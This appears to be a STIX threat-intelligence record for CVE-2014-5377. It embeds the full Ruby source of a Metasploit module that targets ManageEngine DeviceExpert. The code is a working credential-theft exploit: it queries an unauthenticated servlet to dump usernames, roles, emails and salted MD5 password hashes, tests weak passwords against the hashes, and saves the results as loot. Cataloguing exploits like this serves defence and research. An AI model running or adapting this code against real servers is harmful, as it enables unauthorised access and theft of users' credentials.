{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1824ef6d-6bcb-462d-9c31-06403a0a2a81",
    "created": "2024-08-14T16:31:00.91232Z",
    "modified": "2024-08-14T16:31:00.912323Z",
    "name": "ManageEngine DeviceExpert User Credentials",
    "description": " This module extracts usernames and salted MD5 password hashes from ManageEngine DeviceExpert version 5.9 build 5980 and prior.  This module has been tested successfully on DeviceExpert version 5.9.7 build 5970.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/manageengine_deviceexpert_user_creds.rb",
            "external_id": "manageengine_deviceexpert_user_creds.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5377"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'ManageEngine DeviceExpert User Credentials',\n      'Description'    => %q{\n        This module extracts usernames and salted MD5 password hashes\n        from ManageEngine DeviceExpert version 5.9 build 5980 and prior.\n\n        This module has been tested successfully on DeviceExpert\n        version 5.9.7 build 5970.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Discovery and exploit\n          'bcoles'  # metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB', '34449'],\n          ['OSVDB', '110522'],\n          ['CVE', '2014-5377']\n        ],\n      'DisclosureDate' => '2014-08-28'))\n    register_options(\n      [\n        Opt::RPORT(6060),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ])\n  end\n\n  def check\n    get_users ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe\n  end\n\n  def get_users\n    users = nil\n    vprint_status(\"Reading users from master...\")\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'ReadUsersFromMasterServlet'))\n    if !res\n      vprint_error(\"Connection failed\")\n    elsif res.code == 404\n      vprint_error(\"Could not find 'ReadUsersFromMasterServlet'\")\n    elsif res.code == 200 && res.body =~ /<discoverydata>(.+)<\\/discoverydata>/\n      users = res.body.scan(/<discoverydata>(.*?)<\\/discoverydata>/)\n      vprint_good(\"Found #{users.length} users\")\n    else\n      vprint_error(\"Could not find any users\")\n    end\n    users\n  end\n\n  def parse_user_data(user)\n    return if user.nil?\n    username = user.scan(/<username>([^<]+)</).flatten.first\n    encoded_hash = user.scan(/<password>([^<]+)</).flatten.first\n    role = user.scan(/<userrole>([^<]+)</).flatten.first\n    mail = user.scan(/<emailid>([^<]+)</).flatten.first\n    salt = user.scan(/<saltvalue>([^<]+)</).flatten.first\n    hash = Rex::Text.decode_base64(encoded_hash).unpack('H*').flatten.first\n    pass = nil\n    ['12345', 'admin', 'password', username].each do |weak_password|\n      if hash == Rex::Text.md5(weak_password + salt)\n        pass = weak_password\n        break\n      end\n    end\n    [username, pass, hash, role, mail, salt]\n  end\n\n  def run_host(ip)\n    users = get_users\n    return if users.nil?\n\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    cred_table = Rex::Text::Table.new(\n      'Header'  => 'ManageEngine DeviceExpert User Credentials',\n      'Indent'  => 1,\n      'Columns' =>\n        [\n          'Username',\n          'Password',\n          'Password Hash',\n          'Role',\n          'E-mail',\n          'Password Salt'\n        ]\n    )\n\n    vprint_status(\"Parsing user data...\")\n    users.each do |user|\n      record = parse_user_data(user.to_s)\n      next if record.join.empty?\n\n      user = record[0]\n      pass = record[1]\n      hash = record[2]\n      role = record[3]\n      mail = record[4]\n      salt = record[5]\n\n      cred_table << [user, pass, hash, role, mail, salt]\n\n      if pass\n        print_good(\"Found weak credentials (#{user}:#{pass})\")\n        credential_data = {\n          origin_type: :service,\n          module_fullname: self.fullname,\n          private_type: :password,\n          private_data: pass,\n          username: user\n        }\n      else\n        credential_data = {\n          origin_type: :service,\n          module_fullname: self.fullname,\n          private_type: :nonreplayable_hash,\n          private_data: \"#{salt}:#{hash}\",\n          username: user\n        }\n      end\n\n      credential_data.merge!(service_data)\n      credential_core = create_credential(credential_data)\n      login_data = {\n        core: credential_core,\n        access_level: role,\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n\n    end\n\n    print_line\n    print_line(\"#{cred_table}\")\n    loot_name     = 'manageengine.deviceexpert.user.creds'\n    loot_type     = 'text/csv'\n    loot_filename = 'manageengine_deviceexpert_user_creds.csv'\n    loot_desc     = 'ManageEngine DeviceExpert User Credentials'\n    p = store_loot(\n      loot_name,\n      loot_type,\n      rhost,\n      cred_table.to_csv,\n      loot_filename,\n      loot_desc)\n    print_status \"Credentials saved in: #{p}\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-28"
}